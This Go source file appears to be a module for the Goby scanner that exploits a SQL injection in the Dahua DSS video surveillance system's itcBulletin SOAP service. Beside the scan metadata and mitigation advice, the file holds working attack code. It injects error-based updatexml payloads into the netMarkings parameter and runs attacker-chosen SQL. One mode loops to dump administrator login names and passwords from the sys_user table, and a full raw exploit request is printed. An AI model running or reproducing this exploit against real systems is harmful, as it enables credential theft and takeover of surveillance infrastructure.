package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS Digital Surveillance System itcBulletin  netMarkings SQL Injection Vulnerability",
    "Description": "<p>Dahua DSS digital surveillance system is a security video surveillance system developed by Dahua. It has functions such as real-time monitoring, PTZ operation, video playback, alarm processing, and equipment management.</p><p>An attacker can send specially constructed data packets to the /portal/services/itcBulletin route and use error injection to obtain sensitive database information.</p>",
    "Product": "dahua-DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2023-03-10",
    "Author": "White_2021@163.com",
    "FofaQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"/>\" || body=\"dahuaDefined/headCommon.js\" || title==\"DSS\"",
    "GobyQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"/>\" || body=\"dahuaDefined/headCommon.js\" || title==\"DSS\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,getLoginInfo,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select substr(group_concat(id,login_name,login_pass),1,31) from sys_user",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2020-73482"
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "大华 DSS 数字监控系统 itcBulletin 路径 netMarkings 参数 SQL 注入漏洞",
            "Product": "dahua-DSS",
            "Description": "<p>大华 DSS 数字监控系统是大华开发的一款安防视频监控系统，拥有实时监视、云台操作、录像回放、报警处理、设备管理等功能。</p><p>攻击者可向 /portal/services/itcBulletin 路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua DSS Digital Surveillance System itcBulletin  netMarkings SQL Injection Vulnerability",
            "Product": "dahua-DSS",
            "Description": "<p>Dahua DSS digital surveillance system is a security video surveillance system developed by Dahua. It has functions such as real-time monitoring, PTZ operation, video playback, alarm processing, and equipment management.</p><p>An attacker can send specially constructed data packets to the /portal/services/itcBulletin route and use error injection to obtain sensitive database information.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-28",
    "PocId": "10840"
}`
	sendPayload240c8825 := func(u *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/portal/services/itcBulletin?wsdl")
		cfg.Data = `<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,(` + sql + `),0x7e),1))) and (1=1
      </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>`
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			sql := "select 0x" + hex.EncodeToString([]byte(checkStr))
			rsp, _ := sendPayload240c8825(hostInfo, sql)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				rsp, err := sendPayload240c8825(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				// 报错注入 32 字符回显长度限制
				expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "XPATH syntax error: '")+22 : strings.Index(rsp.Utf8Html, "XPATH syntax error: '")+53]
			} else if attackType == "getLoginInfo" {
				offset := 1
				for {
					rsp, _ := sendPayload240c8825(expResult.HostInfo, "select substr(group_concat(login_name, \" \",login_pass),"+strconv.Itoa(offset)+",30) from sys_user")
					if res := rsp.Utf8Html[strings.Index(rsp.Utf8Html, "'~")+2 : strings.Index(rsp.Utf8Html, "~';")]; res != "" {
						expResult.Output += res
						offset += 30
					} else {
						break
					}
					if offset > 1100 {
						break
					}
				}
				if expResult.Output != "" {
					expResult.Success = true
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				checkStr := goutils.RandomHexString(8)
				sql = "select 0x" + hex.EncodeToString([]byte(checkStr))
				rsp, _ := sendPayload240c8825(expResult.HostInfo, sql)
				expResult.Success = rsp != nil && strings.Contains(rsp.Utf8Html, checkStr)
				if expResult.Success {
					expResult.Output = `漏洞利用数据包如下：

POST /portal/services/itcBulletin?wsdl HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 399
Accept-Encoding: gzip, deflate
Connection: close

<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
       (updatexml(1,concat(0x7e,(select substr(group_concat(id,login_name,login_pass),1,31) from sys_user),0x7e),1))) and (1=1
	  </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>`
				} else {
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
